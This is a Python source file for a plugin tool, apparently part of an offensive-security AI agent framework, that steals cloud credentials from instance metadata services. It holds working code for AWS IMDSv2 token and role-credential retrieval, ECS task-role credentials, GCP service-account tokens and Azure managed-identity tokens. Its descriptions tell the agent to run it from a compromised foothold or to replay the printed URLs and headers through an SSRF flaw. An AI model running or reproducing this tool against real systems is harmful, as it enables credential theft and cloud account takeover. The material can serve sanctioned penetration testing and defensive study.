"""
cloud_metadata.py - dedicated cloud metadata-service (IMDS) tool.

Metadata-service abuse is THE cloud credential-theft primitive. A generic
http_request can reach it, but the versions/headers/paths are fiddly and cloud-
specific (IMDSv2 needs a PUT token first; GCP needs a header; ECS uses a different
IP). This tool encodes the correct sequence per provider so the agent gets creds
reliably. Run it ON a cloud host/foothold, or use the printed URLs+headers through
an SSRF via http_request.
"""

from __future__ import annotations

from typing import Any

from plugins.sdk.base_tool import BaseTool, Permission, ToolResult

_AWS = "http://169.254.169.254"
_ECS = "http://169.254.170.2"
_GCP = "http://metadata.google.internal/computeMetadata/v1"
_AZURE = "http://169.254.169.254/metadata"


class CloudMetadataTool(BaseTool):
    name = "cloud_metadata"
    description = (
        "Query a cloud instance metadata service (IMDS) for credentials/identity - the "
        "core cloud credential-theft technique. provider: aws | gcp | azure | ecs | auto. "
        "For AWS it does IMDSv2 correctly (PUT a token, then GET the role + its temporary "
        "keys). Also prints the exact URLs+headers so you can replay them through an SSRF "
        "with http_request. Run from a cloud foothold; link-local IMDS is unreachable from "
        "a normal operator host."
    )
    parameters = {
        "type": "object",
        "properties": {
            "provider": {"type": "string",
                         "description": "aws | gcp | azure | ecs | auto", "default": "auto"},
        },
    }
    permissions = {Permission.NETWORK}
    tags = ["cloud", "imds", "metadata", "credentials"]

    async def execute(self, provider: str = "auto", **kwargs: Any) -> ToolResult:
        provider = (provider or "auto").lower()
        from browser.http_client import HttpClient
        out: list[str] = []
        order = [provider] if provider != "auto" else ["aws", "ecs", "gcp", "azure"]
        got_any = False
        async with HttpClient(timeout=6.0) as client:
            for p in order:
                try:
                    res = await self._probe(client, p)
                except Exception as exc:
                    res = f"[{p}] error: {exc}"
                out.append(res)
                if "CREDENTIALS" in res or "token" in res.lower():
                    got_any = True
                    if provider == "auto":
                        break
        hint = ("\nSSRF replay: fetch these same URLs/headers via http_request when you "
                "have SSRF on a cloud-hosted app.")
        return ToolResult.ok("\n\n".join(out) + hint,
                             metadata={"got_credentials": got_any})

    async def _probe(self, client: Any, provider: str) -> str:
        if provider == "aws":
            # IMDSv2: get a token, then use it.
            tok = await client.request("PUT", f"{_AWS}/latest/api/token",
                                       extra_headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})
            hdr = {"X-aws-ec2-metadata-token": tok.text.strip()} if tok.text else {}
            roles = await client.get(f"{_AWS}/latest/meta-data/iam/security-credentials/",
                                     extra_headers=hdr or None)
            if roles.status_code != 200 or not roles.text.strip():
                return f"[aws] no IAM role via IMDS (status {roles.status_code})."
            role = roles.text.strip().splitlines()[0]
            creds = await client.get(
                f"{_AWS}/latest/meta-data/iam/security-credentials/{role}",
                extra_headers=hdr or None)
            return (f"[aws] role={role}\nCREDENTIALS:\n{creds.text[:1500]}\n"
                    "Export AccessKeyId/SecretAccessKey/Token and run `aws sts "
                    "get-caller-identity`.")
        if provider == "ecs":
            import os
            uri = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
            if uri:
                creds = await client.get(_ECS + uri)
                return f"[ecs] task-role CREDENTIALS:\n{creds.text[:1500]}"
            return ("[ecs] $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI not set; from SSRF fetch "
                    f"{_ECS}/v2/credentials/<uuid> or the relative URI from the env.")
        if provider == "gcp":
            r = await client.get(f"{_GCP}/instance/service-accounts/default/token",
                                 extra_headers={"Metadata-Flavor": "Google"})
            return (f"[gcp] token endpoint status {r.status_code}:\n{r.text[:800]}\n"
                    "(needs header Metadata-Flavor: Google)")
        if provider == "azure":
            r = await client.get(
                f"{_AZURE}/identity/oauth2/token?api-version=2018-02-01&resource="
                "https://management.azure.com/",
                extra_headers={"Metadata": "true"})
            return (f"[azure] MSI token status {r.status_code}:\n{r.text[:800]}\n"
                    "(needs header Metadata: true)")
        return f"[{provider}] unknown provider."
